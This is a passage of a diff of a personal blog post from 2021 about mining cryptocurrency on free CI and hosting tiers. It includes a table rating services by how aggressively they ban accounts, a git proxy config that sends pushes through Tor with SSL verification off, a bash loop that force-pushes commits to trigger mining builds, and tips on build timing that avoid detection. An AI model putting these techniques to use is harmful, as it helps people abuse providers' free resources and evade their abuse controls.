center;">Appveyor    <td style = "color: red; text-align: center;">bad    <td style = "color: yellow; text-align: center;">medium    <td style = "color: red; text-align: center;">bad    <tr>    <td style = "text-align: center;">Nevercode    <td style = "color: red; text-align: center;">bad    <td style = "color: green; text-align: center;">good    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Zeist/vercel    <td style = "color: red; text-align: center;">bad    <td style = "color: green; text-align: center;">good    <td style = "color: red; text-align: center;">bad  </table>
 <p>In this context, a <span style="color: green"> good</span> configuration means that it didn&#39;t take much time to configure a <code>ci</code> job for the mining process &#40;like all services relying on a web dashboard instead of a repository dot-file were a chore&#41;, a <span style="color: red"> bad</span> <code>ban-hammer</code> means that it was hard to register to the service, or that accounts would get banned more aggressively.</p>
 <p><a href="https://web.archive.org/web/20210222050951/https://www.bitrise.io/">Bitrise</a> requires to setup a project, to infer the environment, the target architecture, the execution process and other things, it was very time consuming to setup a build so it got a bad rating in configuration. <a href="https://web.archive.org/web/20210310010750/https://continuousphp.com/">Continuousphp</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/">Buddy</a>, &#91;Codefresh&#93; also had a lot of manual non declarative configuration steps.</p>
 <p>Services like &#91;Azure-pipelines&#93;, <a href="https://web.archive.org/web/20210308202144/https://app.wercker.com/">Wercker</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/">Buddy</a> applies shadow-bans on the accounts, shadow-bans are bad, as they leave you guessing if there is something wrong with your configuration or not. With some services you can guess the reason of the ban &#40;pretty much your build took too much time, or you built too many times in a short period&#41;, for some others like &#91;Azure-pipelines&#93; I assume they applied some kind of fingerprint to the user repositories as bans were coming through even without any abuse of resources, azure and vercel also restricted <code>DNS</code> access within public build machines, so that was additional friction that needed to be overcome with ad-hoc tunnel.</p>
-<p><a href="https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome">Drone</a> gave access to a whole 16&#43; cores processor but ended up banning after 2 builds <sup id="fnref:saddrone"><a href="#fndef:saddrone" class="fnref">[13]</a></sup>. <a href="https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship">Codeship</a> also gives access to powerful build hosts and didn&#39;t ban as aggressively as drone.</p>
+<p><a href="https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome">Drone</a> gave access to a whole 16&#43; cores processor but ended up banning after 2 builds <sup id="fnref:saddrone"><a href="#fndef:saddrone" class=fnref >[13]</a></sup>. <a href="https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship">Codeship</a> also gives access to powerful build hosts and didn&#39;t ban as aggressively as drone.</p>
 <p>My favorite services not because of profitability but for ease and convenience &#40;also with other projects&#41; were <a href="https://web.archive.org/web/20210324163536/https://travis-ci.org/">Travis</a>, <a href="https://web.archive.org/web/20210308041527/https://semaphoreci.com/">Semaphore</a> and <a href="https://web.archive.org/web/20210322105637/https://hub.docker.com/">Docker-hub</a>. Travis is like the standard CI and is very flexible, Semaphore is the only <code>DSL</code> for <code>CI</code> that looked approachable and well though instead of just an endless sequence of spaghettified check-boxes like other UIs, and Docker just for the simplicity to map dockerfiles to builds.</p>
-<h3 id="builds_configs"><a href="#builds_configs" class="header-anchor">Builds configs</a></h3>
+<h3 id=builds_configs ><a href="#builds_configs" class=header-anchor >Builds configs</a></h3>
 <p>The builds were triggered either by cron jobs offered by web services or by git commits. So you had to keep track of a littering of access tokens or ssh keys to manage all the git commits. It was also important to not over-spam commits, and use proxies when pushing to the repositories configuring git:</p>
-<pre><code class="toml hljs"><span class="hljs-section">[http]</span>
-        <span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span>
-        <span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span>
-<span class="hljs-section">[https]</span>
-        <span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span>
-        <span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span>
-<span class="hljs-section">[url &quot;https://&quot;]</span>
-    <span class="hljs-attr">insteadOf</span> = git://</code></pre>
+<pre><code class="toml hljs"><span class=hljs-section >[http]</span>
+        <span class=hljs-attr >proxy</span> = socks5://<span class=hljs-number >127.0</span>.<span class=hljs-number >0.1</span>:<span class=hljs-number >9050</span>
+        <span class=hljs-attr >sslverify</span> = <span class=hljs-literal >false</span>
+<span class=hljs-section >[https]</span>
+        <span class=hljs-attr >proxy</span> = socks5://<span class=hljs-number >127.0</span>.<span class=hljs-number >0.1</span>:<span class=hljs-number >9050</span>
+        <span class=hljs-attr >sslverify</span> = <span class=hljs-literal >false</span>
+<span class=hljs-section >[url &quot;https://&quot;]</span>
+    <span class=hljs-attr >insteadOf</span> = git://</code></pre>
 <p>Using git hosting services, github has been the one more thorough about bans, but they were only executed upon abuse reports by ci services admins, gitlab executed a ban wave once, when I tried to renew the CI trial &#40;carelessly&#41;. I have never received a ban for a bitbucket account. To &#40;force&#41; push git commits, we have a long running loop that re-tags the git repository:</p>
-<pre><code class="bash hljs"><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span>
-    repos_count=$(ls -ld <span class="hljs-variable">${repos}</span>/* | grep -c ^d)
+<pre><code class="bash hljs"><span class=hljs-keyword >while</span> :; <span class=hljs-keyword >do</span>
+    repos_count=$(ls -ld <span class=hljs-variable >${repos}</span>/* | grep -c ^d)
     repos_ival=$(((RANDOM%variance+delay)/repos_count))
-    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-variable">$repos</span>/*; <span class="hljs-keyword">do</span>
-        <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$r</span>&quot;</span>
+    <span class=hljs-keyword >for</span> r <span class=hljs-keyword >in</span> <span class=hljs-variable >$repos</span>/*; <span class=hljs-keyword >do</span>
+        <span class=hljs-built_in >cd</span> <span class=hljs-string >&quot;<span class=hljs-variable >$r</span>&quot;</span>
         git fetch --all
         tagger
-        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\e[32m&quot;</span><span class="hljs-string">&quot;sleeping for <span class="hljs-variable">$repos_ival</span> since <span class="hljs-subst">$(date +%H:%M:%S\ %b/%d)</span>&quot;</span><span class="hljs-string">&quot;\e[0m&quot;</span>
-        sleep <span class="hljs-variable">$repos_ival</span>
-    <span class="hljs-keyword">done</span>
+        <span class=hljs-built_in >echo</span> -e <span class=hljs-string >&quot;\e[32m&quot;</span><span class=hljs-string >&quot;sleeping for <span class=hljs-variable >$repos_ival</span> since <span class=hljs-subst >$(date +%H:%M:%S\ %b/%d)</span>&quot;</span><span class=hljs-string >&quot;\e[0m&quot;</span>
+        sleep <span class=hljs-variable >$repos_ival</span>
+    <span class=hljs-keyword >done</span>
     sleep 1
-<span class="hljs-keyword">done</span></code></pre>
+<span class=hljs-keyword >done</span></code></pre>
 <p>It might be possible that force pushing this way is not something github likes very much and could have been a cause for accounts getting flagged. The tagger function tasked with force pushing a different commits, uses a website &#40;which you can lookup quite easily&#41; that gives some randomized commits. I am not sure how much this helps, since the content itself of the commits is obviously suspicious for my case. And it also bit me in the ass once, since the commits returned by this command can include swear words, one of my commits was picked up by a twitter bot that tracks git commits with swear words&#33; I added a blacklist for bad words after the incident.</p>
 <p>I haven&#39;t really delved into obfuscated git commits and obfuscated git repositories. The only instance where I was using a more elaborate repository was with Bitrise since you could not setup a build if the system did not recognize an environment &#40;like mobile apps&#41;, but even then there wasn&#39;t any rotation and it was always the same repository, quite easy to spot.</p>
 <p>Overall, if I had to plot a bell curve around the optimal time to mine <em>without</em> getting accounts banned, across all the tested services, would be with a center around 1 hour build duration, once per day. For cpu cores, apart for a couple out-liars &#40;like drone&#41;, most services expect you use the full amount of resources given to you since builds are run inside VMs or containers with constrained resources...and compilation is usually a task that saturates cpu, so it does not have statistical relevance. Intuitively one build per day is what the average developer would do, so you should expect raised flags if you stray away from the mean, and pushing for abuse never ends well.</p>
-<h2 id="conclusions"><a href="#conclusions" class="header-anchor">Conclusions</a></h2>
+<h2 id=conclusions ><a href="#conclusions" class=header-anchor >Conclusions</a></h2>
 <p>Was it worth it? The networking parts were definitely interesting, dealing with accounts registrations was obviously the worst part, nobodies likes to click endless confirmation emails and repeating mind numbing UI procedures, after all. Writing spam automation software is also boring &#40;because your mostly poking at dumb APIs&#41;, and with this assumption &#40;and the fact that this was never anything serious&#41; I never even considered it. Was it profitable? At its peak it was reaching something like <code>300&#36;</code> per month, maybe enough for a venezuelan, not really for me :&#41;</p>
-<p><table class="fndef" id="fndef:adversary">
+<p><table class=fndef  id="fndef:adversary">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:adversary">[1]</a></td>
-        <td class="fndef-content"><em>the grumpy sysadmin</em></td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:adversary">[1]</a>
+        <td class=fndef-content ><em>the grumpy sysadmin</em>
+    
 </table>
-<table class="fndef" id="fndef:infoproc">
+<table class=fndef  id="fndef:infoproc">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:infoproc">[2]</a></td>
-        <td class="fndef-content">even though this would break many privacy assumptions, I am sure most of them just peek inside whenever there is a incumbent problem, but this is only a problem for container based runtimes, whereas VMs are pretty much black boxes.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:infoproc">[2]</a>
+        <td class=fndef-content >even though this would break many privacy assumptions, I am sure most of them just peek inside whenever there is a incumbent problem, but this is only a problem for container based runtimes, whereas VMs are pretty much black boxes.
+    
 </table>
-<table class="fndef" id="fndef:monerominer">
+<table class=fndef  id="fndef:monerominer">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:monerominer">[3]</a></td>
-        <td class="fndef-content">the miner built into the monero node got some work to make it more background friendly, but the distribution of xmrig was never focused on background friendliness.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:monerominer">[3]</a>
+        <td class=fndef-content >the miner built into the monero node got some work to make it more background friendly, but the distribution of xmrig was never focused on background friendliness.
+    
 </table>
-<table class="fndef" id="fndef:difficulty">
+<table class=fndef  id="fndef:difficulty">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:difficulty">[5]</a></td>
-        <td class="fndef-content">some pools offer different difficulties on different connection ports, and tend to align the job difficulty to the miner submitted shares, but the granularity of the proxy was still more convenient, as it would prevent pool <a href="https://en.wikipedia.org/wiki/Vendor_lock-in">lock-in</a> &#40;although we never really switched pools &#41;.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:difficulty">[5]</a>
+        <td class=fndef-content >some pools offer different difficulties on different connection ports, and tend to align the job difficulty to the miner submitted shares, but the granularity of the proxy was still more convenient, as it would prevent pool <a href="https://en.wikipedia.org/wiki/Vendor_lock-in">lock-in</a> &#40;although we never really switched pools &#41;.
+    
 </table>
-<table class="fndef" id="fndef:configwatch">
+<table class=fndef  id="fndef:configwatch">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:configwatch">[4]</a></td>
-        <td class="fndef-content">it wasn&#39;t happy when the config suddenly appeared and disappeared from the file system</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:configwatch">[4]</a>
+        <td class=fndef-content >it wasn&#39;t happy when the config suddenly appeared and disappeared from the file system
+    
 </table>
-<table class="fndef" id="fndef:stratumprotocol">
+<table class=fndef  id="fndef:stratumprotocol">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:stratumprotocol">[6]</a></td>
-        <td class="fndef-content">We don&#39;t talk about the <a href="https://en.bitcoin.it/wiki/Stratum_mining_protocol">stratum protocol</a> since we just have to deal with whatever is implemented in <em>both</em> the pool and the miner...which is usually the bare minimum, and possibly with non standard extensions.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:stratumprotocol">[6]</a>
+        <td class=fndef-content >We don&#39;t talk about the <a href="https://en.bitcoin.it/wiki/Stratum_mining_protocol">stratum protocol</a> since we just have to deal with whatever is implemented in <em>both</em> the pool and the miner...which is usually the bare minimum, and possibly with non standard extensions.
+    
 </table>
-<table class="fndef" id="fndef:fullbash">
+<table class=fndef  id="fndef:fullbash">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:fullbash">[7]</a></td>
-        <td class="fndef-content">never go full bash :&#41;</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:fullbash">[7]</a>
+        <td class=fndef-content >never go full bash :&#41;
+    
 </table>
-<table class="fndef" id="fndef:memoryondemand">
+<table class=fndef  id="fndef:memoryondemand">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:memoryondemand">[8]</a></td>
-        <td class="fndef-content">I have not explored what happens when a processes loads additional functionality at runtime, as the kernel would look for the address in the memory layout of the executable, which would access the filesystem and possibly causing a crash.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:memoryondemand">[8]</a>
+        <td class=fndef-content >I have not explored what happens when a processes loads additional functionality at runtime, as the kernel would look for the address in the memory layout of the executable, which would access the filesystem and possibly causing a crash.
+    
 </table>
-<table class="fndef" id="fndef:freehostinglimits">
+<table class=fndef  id="fndef:freehostinglimits">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:freehostinglimits">[9]</a></td>
-        <td class="fndef-content">Limits are arbitrary, cpu time is less than a second, memory is less than 128M, outbound connections are blocked.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:freehostinglimits">[9]</a>
+        <td class=fndef-content >Limits are arbitrary, cpu time is less than a second, memory is less than 128M, outbound connections are blocked.
+    
 </table>
-<table class="fndef" id="fndef:cpanelssh">
+<table class=fndef  id="fndef:cpanelssh">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:cpanelssh">[10]</a></td>
-        <td class="fndef-content">with a little bit of patience you can also run a full ssh instance over an environment bootstrapped around your cpanel account space, <em>without</em> having access to the cpanel builtin SSH which tends to be disabled by hosting providers.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:cpanelssh">[10]</a>
+        <td class=fndef-content >with a little bit of patience you can also run a full ssh instance over an environment bootstrapped around your cpanel account space, <em>without</em> having access to the cpanel builtin SSH which tends to be disabled by hosting providers.
+    
 </table>
-<table class="fndef" id="fndef:openshift">
+<table class=fndef  id="fndef:openshift">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:openshift">[11]</a></td>
-        <td class="fndef-content">openshift went from a 1 year free tier to 3 months to 1 month, starting to require phone authentication, I can guarantee I was not the only one abusing their services.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:openshift">[11]</a>
+        <td class=fndef-content >openshift went from a 1 year free tier to 3 months to 1 month, starting to require phone authentication, I can guarantee I was not the only one abusing their services.
+    
 </table>
-<table class="fndef" id="fndef:herokucontainers">
+<table class=fndef  id="fndef:herokucontainers">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:herokucontainers">[12]</a></td>
-        <td class="fndef-content">Heroku free tier containers are quite generous in resources, they provide 4c/8t &#40;virtual&#41; cpus, plenty of ram and large storage &#40;which however is not persistent and discarded on dyno shutdown&#41;.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:herokucontainers">[12]</a>
+        <td class=fndef-content >Heroku free tier containers are quite generous in resources, they provide 4c/8t &#40;virtual&#41; cpus, plenty of ram and large storage &#40;which however is not persistent and discarded on dyno shutdown&#41;.
+    
 </table>
-<table class="fndef" id="fndef:saddrone">
+<table class=fndef  id="fndef:saddrone">
     <tr>
-        <td class="fndef-backref"><a href="#fnref:saddrone">[13]</a></td>
-        <td class="fndef-content">They adde muc strictier registration rules, after a couple of bans, I might have contributed to it.</td>
-    </tr>
+        <td class=fndef-backref ><a href="#fnref:saddrone">[13]</a>
+        <td class=fndef-content >They adde muc strictier registration rules, after a couple of bans, I might have contributed to it.
+    
 </table>
   </p>
-<div id="post-tags-list">
+<div id=post-tags-list >
 Post Tags:
-<span class="post-tag"><a href="/posts/tag/crypto" style=""> crypto </a>, </span>
-<span class="post-tag"><a href="/posts/tag/net" style=""> net </a>, </span>
-<span class="post-tag"><a href="/posts/tag/shell" style=""> shell </a></span></div>
-<div class="page-foot">
+<span class=post-tag ><a href="/posts/tag/crypto" style=""> crypto </a>, </span>
+<span class=post-tag ><a href="/posts/tag/net" style=""> net </a>, </span>
+<span class=post-tag ><a href="/posts/tag/shell" style=""> shell </a></span></div>
+<div class=page-foot >
     
-    <div class="copyright">
+    <div class=copyright >
         August 21, 2021
     </div>
-        <script src="https://utteranc.es/client.js"
-        repo="untoreh/untoreh.github.io"
-        issue-term="pathname"
-        label="Comment"
-        crossorigin="anonymous"
+        <script src="https://utteranc.es/client.js" repo="untoreh/untoreh.github.io"
+        issue-term=pathname  label=Comment  crossorigin=anonymous 
         async>
     </script>
 
     
 </div>
-</div><div class="page__footer">
+</div><div class=page__footer >
     <footer>
-        <!-- start custom footer snippets -->
-        <!-- end custom footer snippets -->
-        <div class="page__footer-copyright">
+        
+        
+        <div class=page__footer-copyright >
             © untoreh - Powered by <a href=
                                                      "https://github.com/tlienart/Franklin.jl">Franklin</a>
         </div>
-        <div class="page__footer-links">
+        <div class=page__footer-links >
             -
             <ul>
-                <li> <a href="/sitemap.xml">Sitemap</a> </li>
+                <li> <a href="/sitemap.xml">Sitemap</a> 
                 |
-                <li> <a href="/tag">Tags</a> </li>
+                <li> <a href="/tag">Tags</a> 
                 |
-                <li> <a href="/feed.xml">RSS</a> </li>
+                <li> <a href="/feed.xml">RSS</a> 
             </ul>
         </div>
-        <ul class="author__wrap">
+        <ul class=author__wrap >
             <li class="author__urls social-icons">
     <a href="https://twitter.com/untoreh" rel=
     "nofollow noopener noreferrer"><i class=
-    "fab fa-fw fa-twitter-square" aria-hidden="true"></i></a>
-</li>
+    "fab fa-fw fa-twitter-square" aria-hidden=true ></i></a>
+
 <li class="author__urls social-icons">
     <a href="https://github.com/untoreh" rel=
     "nofollow noopener noreferrer"><i class="fab fa-fw fa-github"
-    aria-hidden="true"></i></a>
-</li>
+    aria-hidden=true ></i></a>
+
 <li class="author__urls social-icons">
     <a href="mailto:contact@unto.re"><i class=
     "fas fa-envelope"></i></a>
-</li>
-<li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></li>
+
+<li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script>
 
         </ul>
     </footer>
 </div>
-<!-- ensure font-awesome script has "fa" id for parsing purposes -->
-<script id="fa" defer src=
+
+<script id=fa  defer src=
             "https://use.fontawesome.com/releases/v5.8.2/js/all.js" integrity=
-            "sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH"
-        crossorigin="anonymous"></script>
+            "sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH" crossorigin=anonymous ></script>
 
  
 
@@ -929,5 +779,3 @@ Post Tags:
 <script src="/libs/colors.js"></script>
 <script src="/libs/menu.js"></script>
 <script defer src="/libs/lunr/lunr.min.js"></script>
-</body>
-</html>
